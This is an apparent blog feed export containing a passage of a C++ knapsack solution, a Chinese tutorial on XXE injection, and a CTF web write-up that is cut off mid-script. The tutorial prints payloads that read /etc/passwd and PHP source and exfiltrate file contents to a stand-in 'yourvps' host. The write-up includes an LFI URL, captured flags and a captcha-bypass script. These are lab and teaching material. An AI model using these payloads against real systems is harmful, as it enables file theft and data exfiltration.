class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> unit&#123;</div><div class="line">    <span class="keyword">double</span> unitValue;</div><div class="line">    <span class="keyword">int</span> id;</div><div class="line">    <span class="keyword">double</span> weight;</div><div class="line">    <span class="keyword">double</span> value;</div><div class="line">&#125;unit;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">double</span> m,n;</div><div class="line">    <span class="keyword">static</span> unit valuesor[<span class="number">100010</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;m,&amp;n);</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;valuesor[i].weight,&amp;valuesor[i].value);</div><div class="line">        valuesor[i].unitValue = (<span class="keyword">double</span>)valuesor[i].value / (<span class="keyword">double</span>)valuesor[i].weight;</div><div class="line">        valuesor[i].id = i;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(valuesor,<span class="number">1</span>,n);</div><div class="line"></div><div class="line">    <span class="keyword">double</span> remainSpace = m;</div><div class="line">    <span class="keyword">double</span> allValue = <span class="number">0</span>;</div><div class="line">    i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n ; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainSpace &lt;= <span class="number">0</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">if</span> (valuesor[i].weight &lt;= remainSpace)&#123;</div><div class="line">            remainSpace = remainSpace - valuesor[i].weight;</div><div class="line">            allValue += valuesor[i].value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            allValue += remainSpace *valuesor[i].unitValue;</div><div class="line">            remainSpace = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lf\n"</span>,allValue);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        unit x = s[l];</div><div class="line"></div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[i].unitValue = s[j].unitValue;</div><div class="line">                s[i].id = s[j].id;</div><div class="line">                s[i].value = s[j].value;</div><div class="line">                s[i].weight = s[j].weight;</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[j].unitValue = s[i].unitValue;</div><div class="line">                s[j].id = s[i].id;</div><div class="line">                s[j].value = s[i].value;</div><div class="line">                s[j].weight = s[i].weight;</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        s[i].id = x.id;</div><div class="line">        s[i].unitValue = x.unitValue;</div><div class="line">        s[i].value = x.value;</div><div class="line">        s[i].weight = x.weight;</div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近更新日期：2017-06-21&lt;br&gt;干脆把自己平日做的题放在一篇文章里吧。不然太分散了。&lt;br&gt;POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617&lt;br&gt;XOJ: 1004 1005 1022 1061 1062 1075 1078 1316&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
    
  </entry>
  
  <entry>
    <title>小试XML实体注入攻击</title>
    <link href="http://yoursite.com/2017/07/04/%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2017/07/04/小试XML实体注入攻击/</id>
    <published>2017-07-04T03:12:56.000Z</published>
    <updated>2017-07-04T12:35:52.872Z</updated>
    
    <content type="html"><![CDATA[<p>XML实体注入攻击<br><a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简单介绍一下。</p>
<h2 id="XML基本知识"><a href="#XML基本知识" class="headerlink" title="XML基本知识"></a>XML基本知识</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>chybeta<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>ph0en1x<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在上面代码中的第一行，定义XML的版本与编码。</p>
<p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p>
<p>同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p>
<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p>
<h3 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h3><p>XML实体分为四种：字符实体，命名实体，外部实体，参数实体。</p>
<h2 id="文档类型定义：DTD"><a href="#文档类型定义：DTD" class="headerlink" title="文档类型定义：DTD"></a>文档类型定义：DTD</h2><p>wikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。</p>
<p>其基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE 根元素名 [  元素描述   ]&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="内部引入"><a href="#内部引入" class="headerlink" title="内部引入"></a>内部引入</h3><p>格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体的值"&gt;</span></div></pre></td></tr></table></figure></p>
<p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span>  </div><div class="line"><span class="meta">&lt;!DOCTYPE xxe [  </span></div><div class="line">    &lt;!ENTITY  chybeta  "Hello World!"&gt;    </div><div class="line">]&gt;  </div><div class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </div><div class="line">    &amp;chybeta;</div><div class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>访问该XML文档，<code>&amp;chybeta;</code>会被解析为Hello World!并输出。</p>
<h3 id="外部引入"><a href="#外部引入" class="headerlink" title="外部引入"></a>外部引入</h3><p>基本格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></div></pre></td></tr></table></figure></p>
<p>通过引用定义在外部的DTD中的实体，我们称之为外部实体。<br>由于xxe漏洞主要利用的是外部实体，所以这里暂不展开。具体实例见下。</p>
<h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="xxe注入"><a href="#xxe注入" class="headerlink" title="xxe注入"></a>xxe注入</h2><p>以php环境为例，index.php内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line">  print_r((string)$xml);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="读取本地文件"><a href="#读取本地文件" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><p><img src="https://thief.one/upload_image/20170620/1.png" alt=""></p>
<p>利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///c://TEST.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/2.jpg?raw=true" alt=""></p>
<p>我这里测试时，如果不进行url编码则不能成功解析。</p>
<p>若使用fill协议，在unix环境下，可以用如下xml来读取passwd：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>如果要读取php文件，因为php、html等文件中有各种括号<code>&lt;</code>，<code>&gt;</code>，若直接用file读取会导致解析错误，此时可以利用<code>php://filter</code>将内容转换为base64后再读取。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这里同样先经过url编码后再传入。读取结果如下:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/3.jpg?raw=true" alt=""></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。这里暂不进行测试。</p>
<h3 id="内网探测-SSRF"><a href="#内网探测-SSRF" class="headerlink" title="内网探测/SSRF"></a>内网探测/SSRF</h3><p>由于xml实体注入攻击可以利用<code>http://</code>协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
<h2 id="bind-xxe"><a href="#bind-xxe" class="headerlink" title="bind xxe"></a>bind xxe</h2><p>以php环境为例，现在更改index.php内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  $xml=simplexml_load_string($_GET[<span class="string">'xml'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>少了print_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。</p>
<h3 id="读取本地文件-1"><a href="#读取本地文件-1" class="headerlink" title="读取本地文件"></a>读取本地文件</h3><h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "file:///c://TEST.txt"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在我的vps的xxe.xml的内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt;</div></pre></td></tr></table></figure></p>
<p>而测试文件TEST.txt内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chybeta</div></pre></td></tr></table></figure></p>
<p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/4.jpg?raw=true" alt=""></p>
<p>若要读取php等文件，同样需要先经过base64加密下。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %all;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>查看access.log:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/5.jpg?raw=true" alt=""></p>
<h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h4><p>发送的xml：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE data  [</span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;</div><div class="line">%dtd; %send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
<p>而在vps上的xxe.xml内容为：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload2 "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://yourvps/%file;'&gt;"&gt; %payload2;</div></pre></td></tr></table></figure></p>
<p>注意的是，<code>&amp;#25;</code> 不能直接写成<code>%</code>，否则无法解析。</p>
<p>xxe.xml中定义和引用了<code>%payload2</code>,在通过<code>%dtd</code>引入xxe.xml后，得以使用符号实体%send来进行发送。其中%file为读取的文件内容。查看access.log:</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/6.jpg?raw=true" alt=""></p>
<h1 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h1><h2 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h2><p>拿jarvisoj平台上的题目来小试牛刀吧。</p>
<p>题目：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="external">api调用</a></p>
<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/7.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/8.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170704/9.jpg?raw=true" alt=""></p>
<h2 id="xxe相关WP"><a href="#xxe相关WP" class="headerlink" title="xxe相关WP"></a>xxe相关WP</h2><ul>
<li><a href="http://z1ng.net/post/thoughts/alictf-2014-writeup" target="_blank" rel="external">AliCTF-Quals-2014 WebA-300</a></li>
<li><a href="https://github.com/iAklis/epub-library-challenge" target="_blank" rel="external">HCTF-2016 大图书管的牧羊人&amp;&amp;魔法禁书目录</a></li>
<li><a href="https://gist.github.com/h3xstream/3d51b99f651548f7fa2b" target="_blank" rel="external">GoSecure-CTF-2015 web-300</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XML实体注入攻击&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="XML注入" scheme="http://yoursite.com/tags/XML%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ringzer0team-web-writeup</title>
    <link href="http://yoursite.com/2017/06/30/%C2%96ringzer0team-web-writeup/"/>
    <id>http://yoursite.com/2017/06/30/ringzer0team-web-writeup/</id>
    <published>2017-06-30T10:10:49.000Z</published>
    <updated>2017-07-01T14:12:45.461Z</updated>
    
    <content type="html"><![CDATA[<p>ringzer0team-web<br><a id="more"></a></p>
<h1 id="Big-Brother-is-watching"><a href="#Big-Brother-is-watching" class="headerlink" title="Big Brother is watching"></a>Big Brother is watching</h1><p>题目地址： <a href="https://ringzer0team.com/challenges/212" target="_blank" rel="external">https://ringzer0team.com/challenges/212</a></p>
<p>题目提示：Even Google cannot find this onegoogle是搜索引擎，能阻止它的自然是。。。robots.txt啦<br>访问<a href="https://ringzer0team.com/robots.txt" target="_blank" rel="external">https://ringzer0team.com/robots.txt</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User-agent: *</div><div class="line">Disallow: /16bfff59f7e8343a2643bdc2ee76b2dc/</div></pre></td></tr></table></figure></p>
<p>访问 <a href="https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/" target="_blank" rel="external">https://ringzer0team.com/16bfff59f7e8343a2643bdc2ee76b2dc/</a></p>
<p>得到flag；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-G5swO95w0c7R5fq0sa85nVs5dK49O04i</div></pre></td></tr></table></figure></p>
<h1 id="Looking-for-password-file"><a href="#Looking-for-password-file" class="headerlink" title="Looking for password file"></a>Looking for password file</h1><p>题目地址：<a href="http://ringzer0team.com:1008/?page=lorem.php" target="_blank" rel="external">http://ringzer0team.com:1008/?page=lorem.php</a></p>
<p>读取password，猜测是passwd文件。访问：<a href="http://ringzer0team.com:1008/?page=/etc/passwd" target="_blank" rel="external">http://ringzer0team.com:1008/?page=/etc/passwd</a></p>
<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-zH9g1934v774Y7Zx5s16t5ym8Z</div></pre></td></tr></table></figure></p>
<h1 id="Area-51"><a href="#Area-51" class="headerlink" title="Area 51"></a>Area 51</h1><p>题目地址：<a href="https://ringzer0team.com/challenges/48" target="_blank" rel="external">https://ringzer0team.com/challenges/48</a></p>
<p>题目提示：Access to this area is restricted using some secure .htaccess</p>
<p>.htaccess中可以限制各种请求。通过尝试后，抓包，改请求方式GET为PUT。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-w4KRr557y626izv567758O52</div></pre></td></tr></table></figure></p>
<h1 id="Headache"><a href="#Headache" class="headerlink" title="Headache"></a>Headache</h1><p>题目提示：Answer is closer than you think!</p>
<p>head，所以我们抓包看头部。得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-365m4fU5p2DVEQbfrptDE5Ru]</div></pre></td></tr></table></figure></p>
<h1 id="Words-mean-something"><a href="#Words-mean-something" class="headerlink" title="Words mean something?"></a>Words mean something?</h1><p>给了一段不知所云的文字。。不懂就抓包咯。抓包后在cookie处发现<code>flag：0</code>。修改后发包得到flag：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/4.jpg?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-AnlAb6QxDpQvg1yn2bAhyOJw</div></pre></td></tr></table></figure></p>
<h1 id="Admin-Panel"><a href="#Admin-Panel" class="headerlink" title="Admin Panel"></a>Admin Panel</h1><p>有一个登陆框，随便输点什么进去，抓包后发现一个302跳转，在跳转页面里有一个奇怪的东西，见下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/5.jpg?raw=true" alt=""></p>
<p>将方法改成GET请求，在尾部添加：<code>?showflagforme=yesIwantafla</code>。见下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=truehttps://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170630/6.jpg?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-Sfi8sZgAK0ddMjVSOQU2rMfUWS</div></pre></td></tr></table></figure></p>
<h1 id="Captcha-I"><a href="#Captcha-I" class="headerlink" title="Captcha I"></a>Captcha I</h1><p>题目地址：<a href="http://captcha.ringzer0team.com:7421/form1.php" target="_blank" rel="external">http://captcha.ringzer0team.com:7421/form1.php</a><br>测试一次后，题目提示说要验证一千次。查看源代码，可以发现如下js代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">doIt</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	<span class="keyword">var</span> A = <span class="built_in">document</span>.getElementById(<span class="string">'captcha-form'</span>).value;</div><div class="line">	<span class="keyword">if</span> (A == <span class="string">"ehage"</span>)&#123;</div><div class="line">		<span class="built_in">document</span>.forms[<span class="string">"Form1"</span>].submit();</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span> &#123;</div><div class="line">		alert(<span class="string">"BAD Captcha"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>其中if判断条件里的<code>ehage</code>就是当前的验证码，所以只要写脚本提取出这段字符串，然后再发包就行啦。脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">cookie = &#123;<span class="string">'_ga'</span>:<span class="string">'GA1.2.1373385590.1498799275'</span>,<span class="string">'_gid'</span>:<span class="string">'GA1.2.867459789.1498799275'</span>,<span class="string">'_gat'</span>:<span class="string">'1'</span>,<span class="string">'PHPSESSID'</span>:<span class="string">'1kr76vh1164sbgeflnngimi321'</span>&#125;</div><div class="line">url = <span class="string">'http://captcha.ringzer0team.com:7421'</span></div><div class="line">headers = &#123;<span class="string">'Authorization'</span>:<span class="string">'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='</span>&#125;</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">	 <span class="comment"># get captacha</span></div><div class="line">	 r = requests.get(<span class="string">"http://captcha.ringzer0team.com:7421/form1.php"</span>,cookies=cookie,headers=headers)</div><div class="line">	 start_addr = r.text.find(<span class="string">'if (A == "'</span>) + len(<span class="string">'if (A == "'</span>)</div><div class="line">	 end_addr = r.text.find(<span class="string">'"'</span>,start_addr)</div><div class="line">	 captcha = r.text[start_addr:end_addr]</div><div class="line">	 print(i,<span class="string">":"</span>,captcha)</div><div class="line">	 k = requests.get(<span class="string">"http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new"</span>,cookies=cookie,headers=headers)</div><div class="line">	 data = &#123;<span class="string">'captcha'</span>: captcha&#125;</div><div class="line">	 k = requests.post(<span 